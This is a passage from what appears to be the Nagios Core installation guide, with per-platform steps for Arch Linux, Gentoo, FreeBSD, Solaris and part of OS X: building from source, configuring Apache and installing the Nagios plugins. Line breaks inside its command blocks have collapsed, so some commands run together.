remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ``` systemctl start httpd.service  ```   Start Service / Daemon This command starts Nagios Core.  ``` systemctl start nagios.service ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed.  ``` dnf install -y gcc glibc glibc-common openssl-devel perl wget gettext make net-snmp net-snmp-utils perl-Net-SNMP automake autoconf  ```   Downloading The Source ``` cd /tmpwget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gztar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-release-2.4.6/./tools/setup./configuremakemake install ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands These commands are for starting / stopping / restarting / status Nagios.  ``` systemctl start nagios.servicesystemctl stop nagios.servicesystemctl restart nagios.servicesystemctl status nagios.service  ```      Arch Linux Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. SELinux is not installed on a base build of Arch Linux. If you would like to see if it is enabled run the following command:  ``` ls -la /etc/selinux/config  ```  If the file does not exist, SELinux is not enabled.   Prerequisites Perform these steps to install the pre-requisite packages.  ``` pacman --noconfirm -Syyupacman --noconfirm -S gcc glibc make wget unzip apache php gd traceroute php-apache  ``` Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/./configure --with-httpd-conf=/etc/httpd/conf/extramake all  ```   Create User And Group This creates the nagios user and group. The http user is also added to the nagios group.  ``` make install-groups-usersusermod -a -G nagios http  ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` make install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot. The Apache httpd service is also configured at this point.  ``` make install-daemoninitsystemctl enable httpd.service  ```   Install Command Mode This installs and configures the external command file.  ``` make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` make install-config  ```   Install Apache Config Files This installs the Apache web server configuration files.  ``` make install-webconf  ```    As well as installing the Apache web server configuration files, there are additional changes required to the Apache config file **httpd.conf** to enable modules.  Commands that do all of these changes are below, but first is a list of the changes being made.  Change this:  ``` LoadModule mpm_event_module modules/mod_mpm_event.so ```  To this:  ``` #LoadModule mpm_event_module modules/mod_mpm_event.so ```    Change this:  ``` #LoadModule mpm_prefork_module modules/mod_mpm_prefork.so ```  To this:  ``` LoadModule mpm_prefork_module modules/mod_mpm_prefork.so ```    Change this:  ``` <IfModule !mpm_prefork_module>        #LoadModule cgid_module libexec/apache24/mod_cgid.so</IfModule><IfModule mpm_prefork_module>        #LoadModule cgi_module libexec/apache24/mod_cgi.so</IfModule> ```  To this:  ``` <IfModule !mpm_prefork_module>        LoadModule cgid_module libexec/apache24/mod_cgid.so</IfModule><IfModule mpm_prefork_module>        LoadModule cgi_module libexec/apache24/mod_cgi.so</IfModule> ```    Change this:  ``` <IfModule dir_module>    DirectoryIndex index.html</IfModule> ```  To this:  ``` <IfModule dir_module>    DirectoryIndex index.php index.html index.htm AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps</IfModule> ```    Add these lines to the end of the file:  ``` LoadModule php7_module modules/libphp7.soInclude "conf/extra/nagios.conf"Include "conf/extra/php7_module.conf"<FilesMatch ".php$">    SetHandler application/x-httpd-php</FilesMatch><FilesMatch ".phps$">    SetHandler application/x-httpd-php-source</FilesMatch>  ```    Execute the following commands to make the changes described above:  ``` sed -i 's/^LoadModule mpm_event_module modules\/mod_mpm_event\.so/#LoadModule mpm_event_module modules\/mod_mpm_event\.so/g' /etc/httpd/conf/httpd.confsed -i 's/^#LoadModule mpm_prefork_module modules\/mod_mpm_prefork\.so/LoadModule mpm_prefork_module modules\/mod_mpm_prefork\.so/g' /etc/httpd/conf/httpd.confsed -i 's/DirectoryIndex index.html/DirectoryIndex index.php index.html index.htm AddType application\/x-httpd-php .phpAddType application\/x-httpd-php-source .phps/g' /etc/httpd/conf/httpd.confsed -i 's/#LoadModule cgid_module/LoadModule cgid_module/g' /etc/httpd/conf/httpd.confsed -i 's/#LoadModule cgi_module/LoadModule cgi_module/g' /etc/httpd/conf/httpd.confecho 'LoadModule php7_module modules/libphp7.so' >> /etc/httpd/conf/httpd.confecho 'Include "conf/extra/nagios.conf"' >> /etc/httpd/conf/httpd.confecho 'Include "conf/extra/php7_module.conf"' >> /etc/httpd/conf/httpd.confprintf '\n<FilesMatch ".php$">\n' >> /etc/httpd/conf/httpd.confprintf '\tSetHandler application/x-httpd-php\n' >> /etc/httpd/conf/httpd.confprintf '</FilesMatch>\n' >> /etc/httpd/conf/httpd.confprintf '<FilesMatch ".phps$">\n' >> /etc/httpd/conf/httpd.confprintf '\tSetHandler application/x-httpd-php-source\n' >> /etc/httpd/conf/httpd.confprintf '</FilesMatch>\n' >> /etc/httpd/conf/httpd.conf  ```   Configure Firewall Arch Linux does not have a firewall enabled in a fresh installation. Please refer to the Arch Linux documentation on allowing TCP port 80 inbound.   Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ``` systemctl start httpd.service ```   Start Service / Daemon This command starts Nagios Core.  ``` systemctl start nagios.service ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed.  ``` pacman --noconfirm -S autoconf gcc glibc make openssl wget perl gettext net-snmp perl-net-snmp automake autoconf ```   Downloading The Source ``` cd /tmpwget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gztar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-release-2.4.6/./tools/setup./configuremakemake install  ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands Different Linux distributions have different methods of starting / stopping / restarting / status Nagios.  ``` systemctl start nagios.servicesystemctl stop nagios.servicesystemctl status nagios.service  ```        Gentoo Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. SELinux is not installed on a base build of Gentoo. If you would like to see if it is enabled run the following command:  ``` ls -la /etc/selinux/config  ```  If the file does not exist, SELinux is not enabled.   Prerequisites Perform these steps to install the pre-requisite packages.  ``` emerge --syncmkdir -p /etc/portage/package.useecho "www-servers/apache dir cgi cgid event prefork apache2_modules_version" >> /etc/portage/package.use/apacheecho "dev-lang/php apache2" >> /etc/portage/package.use/phpecho "app-eselect/eselect-php apache2" >> /etc/portage/package.use/eselect-phpecho "media-libs/gd gd png jpeg" >> /etc/portage/package.use/gdemerge --noreplace sys-devel/gcc sys-libs/glibc net-misc/wget app-arch/unzip www-servers/apache dev-lang/php media-libs/gd  ``` Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/./configure --with-httpd-conf=/etc/apache2/vhosts.d --sysconfdir=/usr/local/nagios/etcmake all  ```   Create User And Group This creates the nagios user and group. The http user is also added to the nagios group.  ``` make install-groups-usersusermod -a -G nagios apache  ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` make install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot. The apache2 service also needs to be configured to start at boot.  ===== openrc =====  ``` make install-daemoninitrc-update add apache2 default ```    ===== systemd =====  ``` make install-daemoninitsystemctl enable apache2.service ```   Install Command Mode This installs and configures the external command file.  ``` make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` make install-config  ```   Install Apache Config Files This installs the Apache web server configuration files.  ``` make install-webconf  ```    As well as installing the Apache web server configuration files, there are additional changes required to the Apache config file **apache2** to enable modules.  Commands that do all of these changes are below, but first is a list of the changes being made.  In the file /etc/conf.d/apache2 change this:  ``` APACHE2_OPTS="-D DEFAULT_VHOST -D INFO -D SSL -D SSL_DEFAULT_VHOST -D LANGUAGE" ```  To this:  ``` APACHE2_OPTS="-D DEFAULT_VHOST -D INFO -D SSL -D SSL_DEFAULT_VHOST -D LANGUAGE -D PHP" ```    The /run/apache\_ssl\_mutex directory also needs to be created.    Execute the following commands to make the change described above:  ``` sed -i '/^APACHE2_OPTS=/s/\([^"]*\)"$/\1 '"-D PHP"'"/' /etc/conf.d/apache2mkdir -p /run/apache_ssl_mutex  ```   Configure Firewall Gentoo does not have a firewall enabled in a fresh installation. Please refer to the Gentoo documentation on allowing TCP port 80 inbound. Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Restart Apache Web Server ===== openrc =====  ``` rc-service apache2 restart ```    ===== systemd =====  ``` systemctl restart apache2.service ```   Start Service / Daemon This command starts Nagios Core.  ===== openrc =====  ``` rc-service nagios start ```    ===== systemd =====  ``` systemctl start nagios.service ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed.  ``` emerge --noreplace sys-devel/gcc sys-libs/glibc net-misc/wget sys-devel/make sys-devel/gettext sys-devel/automake sys-devel/autoconf dev-libs/openssl net-analyzer/net-snmp dev-perl/Net-SNMP ```   Downloading The Source ``` cd /tmpwget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gztar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-release-2.4.6/./tools/setup./configuremakemake installchmod u+s /bin/pingchmod u+s /bin/ping6  ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands The different init systems have different methods of starting / stopping / restarting / status Nagios.  ===== openrc =====  ``` rc-service nagios startrc-service nagios stoprc-service nagios statusrc-service nagios restart  ```    ===== systemd =====  ``` systemctl start nagios.service systemctl stop nagios.servicesystemctl status nagios.servicesystemctl restart nagios.service ```        FreeBSD Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. SELinux is not enabled by default on FreeBSD. If you would like to see if it is enabled run the following command:  ``` ls -la /etc/selinux/config  ```  If the file does not exist, SELinux is not enabled.   Prerequisites Perform these steps to install the pre-requisite packages.  ``` pkg install -y wget autoconf automake gmake gettext gcc apache24 php73 php73-extensions mod_php73 libgd gperf ``` Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/./configure --with-httpd-conf=/usr/local/etc/apache24/Includesgmake all ```   Create User And Group This creates the nagios user and group. The www user is also added to the nagios group.  ``` gmake install-groups-userspw group mod nagios -m www ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` gmake installchown nagios:nagios /usr/local/nagios/bin/*  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot.  ``` gmake install-daemoninitecho '/usr/local/etc/rc.d/nagios start' >> /etc/rc.local ```    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` gmake install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` gmake install-config  ```   Install Apache Config Files This installs the Apache web server configuration files.  ``` gmake install-webconf  ```    As well as installing the Apache web server configuration files, there are additional changes required to the Apache config file **httpd.conf** to enable modules.  Commands that do all of these changes are below, but first is a list of the changes being made.  Change this:  ``` <IfModule !mpm_prefork_module>        #LoadModule cgid_module libexec/apache24/mod_cgid.so</IfModule><IfModule mpm_prefork_module>        #LoadModule cgi_module libexec/apache24/mod_cgi.so</IfModule> ```  To this:  ``` <IfModule !mpm_prefork_module>        LoadModule cgid_module libexec/apache24/mod_cgid.so</IfModule><IfModule mpm_prefork_module>        LoadModule cgi_module libexec/apache24/mod_cgi.so</IfModule> ```    Change this:  ``` <IfModule dir_module>    DirectoryIndex index.html</IfModule> ```  To this:  ``` <IfModule dir_module>    DirectoryIndex index.php index.html index.htm AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps</IfModule> ```    Add these lines to the end of the file:  ``` <FilesMatch ".php$">    SetHandler application/x-httpd-php</FilesMatch><FilesMatch ".phps$">    SetHandler application/x-httpd-php-source</FilesMatch>  ```    Execute the following commands to make the changes described above:  ``` cp /usr/local/etc/php.ini-production /usr/local/etc/php.iniecho 'apache24_enable="YES"' >> /etc/rc.confsed -i '' 's/DirectoryIndex index.html/DirectoryIndex index.php index.html index.htm AddType application\/x-httpd-php .phpAddType application\/x-httpd-php-source .phps/g' /usr/local/etc/apache24/httpd.confsed -i '' 's/#LoadModule cgid_module/LoadModule cgid_module/g' /usr/local/etc/apache24/httpd.confsed -i '' 's/#LoadModule cgi_module/LoadModule cgi_module/g' /usr/local/etc/apache24/httpd.confprintf '\n<FilesMatch ".php$">\n' >> /usr/local/etc/apache24/httpd.confprintf '\tSetHandler application/x-httpd-php\n' >> /usr/local/etc/apache24/httpd.confprintf '</FilesMatch>\n' >> /usr/local/etc/apache24/httpd.confprintf '<FilesMatch ".phps$">\n' >> /usr/local/etc/apache24/httpd.confprintf '\tSetHandler application/x-httpd-php-source\n' >> /usr/local/etc/apache24/httpd.confprintf '</FilesMatch>\n' >> /usr/local/etc/apache24/httpd.conf  ```   Configure Firewall Please refer to the FreeBSD documentation for information on how to enable or configure IP Filter to allow TCP port 80 inbound.  [Documentation - Firewalls](https://www.freebsd.org/doc/handbook/firewalls.html "Firewalls")     Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ``` service apache24 start  ```   Start Service / Daemon This command starts Nagios Core.  ``` service nagios start  ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed. In the steps below, when installing FreeBSD packages you will be prompted with screens asking what you would like installed. You can just press **Enter** to accept the default selections.  ``` pkg install -y wget autoconf automake gettext gcc openssl-devel net-snmp p5-Net-SNMP-Util ```   Downloading The Source ``` cd /tmpwget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gztar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-release-2.4.6/./tools/setup./configuregmakegmake install ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands Different Linux distributions have different methods of starting / stopping / restarting / status Nagios.  ``` service nagios startservice nagios stopservice nagios restartservice nagios status  ```        Solaris  Tested with Solaris 11.   Security-Enhanced Linux SELinux is not implemented in Solaris and hence is not an issue. Prerequisites Perform these steps to install the pre-requisite packages.  ``` echo 'export PATH=$PATH:/opt/csw/bin:/usr/xpg4/bin:/usr/sfw/bin' >> ~/.profilesource ~/.profilepkgadd -d http://get.opencsw.org/nowanswer allanswer yperl -ni.bak -le 'print; print "mirror=http://mirrors.ibiblio.org/opencsw/stable" if /mirror=/' /etc/opt/csw/pkgutil.confpkgutil -y -i autoconf automake unzip gdpkg install gcc-45 web/php-53 apache-php53 gd  ``` Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/./configure --with-httpd-conf=/etc/apache2/2.2/conf.d --with-gd-inc=/usr/include/gd2gmake all ```   Create User And Group This creates the nagios user and group. The webservd user is also added to the nagios group.  ``` gmake install-groups-usersusermod -G nagios webservd ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` gmake install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot. The Apache httpd service is also configured at this point.  ``` gmake install-daemoninitsvcbundle -o /lib/svc/manifest/site/nagios.xml -s service-name=application/nagios -s rc-script=/etc/init.d/nagios:2 -s model=contract  ```    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` gmake install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` gmake install-config  ```   Install Apache Config Files This installs the Apache web server configuration files. Also configure Apache settings if required.  ``` gmake install-webconf  ```   Configure Firewall On a manually networked system, IP Filter is not enabled by default. Please refer to the Solaris documentation for information on how to enable or configure IP Filter to allow TCP port 80 inbound.  [Documentation - Configuring IP Filter](https://docs.oracle.com/cd/E26502_01/html/E28990/ipfad-10.html "Configuring IP Filter")   Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ``` svcadm enable apache22  ```   Start Service / Daemon This command starts Nagios Core.  ``` svcadm restart manifest-importsvcadm enable nagios  ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Already completed as part of the Nagios installation. Some of the plugins require the NET::SNMP perl module. Please refer to the following documentation:  <http://www.net-snmp.org/docs/README.solaris.html>   Downloading The Source ``` cd /tmpwget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gztar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-release-2.4.6/./tools/setup./configuregmakegmake install ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands These commands are for starting / stopping / restarting / status Nagios.  ``` svcadm enable nagiossvcadm disable nagiossvcadm restart nagiossvcs nagiossvcs -xv nagiossvcadm clear nagios  ```    The following KB article has important information on Solaris and services:  [How To Clear Solaris Service Maintenance Status](https://support.nagios.com/kb/article.php?id=565 "How To Clear Solaris Service Maintenance Status")        Apple OS X Security-Enhanced Linux SELinux is not implemented in Apple OS X and hence is not an issue.   Prerequisites First, make sure Xcode is installed. If it is not installed visit the App Store and install Xcode (*3.8GB download*).  Then you need to download and install MacPorts, instructions for doing this can be found here:  [https://www.macports.org/install.php](https://www.macports.org/install.php "MacPorts")  Once you've done this, follow these steps in a terminal session:  ``` sudo xcodebuild -licenseView the agreement and then type agreesudo xcode-select --install ```  You will be prompted on your Mac display to install the component, click install  Click Agree  Wait while it is downloaded and installed  Continue in your terminal session (you may need to close and open your terminal session):  ``` sudo /opt/local/bin/port install zlib libpng jpeg gd2 apache2 php70 php70-apache2handler ```   Downloading the Source ``` cd /tmpcurl -L -o nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/sudo ./configure --with-httpd-conf=/opt/local/apache2/conf/extra --with-gd-lib=/opt/local/lib --with-gd-inc=/opt/local/includesudo make all ```   Create User And Group Currently Nagios Core does not have a built in script for creating the nagios user and group. However NRPE v3 does have this script, so we're going to download it and run it which makes things easy.  ``` sudo make install-groups-userssudo dseditgroup -o edit -a _www -t user nagios  ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` sudo make install  ```   Install Service / Daemon This installs the script in **/etc/rc.d/init.d/nagios** which is not the correct way it should be run in OS X however a native OS X launch script does not exist in this version of Nagios Core.  ``` sudo make install-daemoninit ```    You will configure it to start at boot using a Global Daemon property list.  Open the vi text editor with the following command:  ``` sudo vi /Library/LaunchDaemons/org.nagios.nagios.plist ```  This creates a new file.  Press **i** on the keyboard to enter *insert* mode.  Paste the following into the vi editor:  ``` <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple/DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict>        <key>Label</key>        <string>org.nagios.nagios</string>        <key>UserName</key>        <string>nagios</string>        <key>GroupName</key>        <string>nagios</string>        <key>Program</key>        <string>/etc/rc.d/init.d/nagios</string>        <key>ProgramArguments</key>        <array>                <string>nagios</string>                <string>start</string>        </array>        <key>KeepAlive</key>        <dict>                <key>SuccessfulExit</key>                <false/>                <key>NetworkState</key>                <true/>        </dict>        <key>RunAtLoad</key>        <true/>        <key>ProcessType</key>        <string>Background</string></dict></plist> ```    Press **escape** on the keyboard to exit *insert* mode.  Type **:wq** on the and press **Enter**.  The file has been saved and Nagios will automatically start on the next boot.    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` sudo make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` sudo make install-config  ```   Install Apache Config Files This installs the Apache web server configuration files.  ``` sudo make install-webconf  ```    As well as installing the Apache web server configuration files, there are additional changes required to the Apache config file **httpd.conf** to enable modules.  Commands that do all of these changes are below, but first is a list of the changes being made.  Change this:  ``` <IfModule dir_module>    DirectoryIndex index.html</IfModule> ```  To this:  ``` <IfModule dir_module>    DirectoryIndex index.php index.html index.htm AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps</IfModule> ```    Add these lines to the end of the file:  ``` Include conf/extra/nagios.confInclude conf/extra/mod_php70.conf  ```    Execute the following commands to make the changes described above:  ``` sudo cp /opt/local/etc/php70/php.ini-production /opt/local/etc/php70/php.inicd /opt/local/apache2/modules/sudo /opt/local/apache2/bin/apxs -a -e -n php7 mod_php70.soprintf '\nInclude conf/extra/nagios.conf\n' | sudo tee -a /opt/local/apache2/conf/httpd.confprintf '\nInclude conf/extra/mod_php70.conf\n' | sudo tee -a /opt/local/apache2/conf/httpd.confsudo sed -i '' 's/DirectoryIndex index.html/DirectoryIndex index.php index.html index.htm AddType application\/x-httpd-php .phpAddType application\/x-httpd-php-source .phps/g' /opt/local/apache2/conf/httpd.conf  ```   Configure Firewall The firewall in OS X is turned off by default. Please refer to the Apple documentation for information on how to enable or configure TCP port 80 inbound.   Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` sudo htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ``` sudo /opt/local/bin/port load apache2  ```   Start 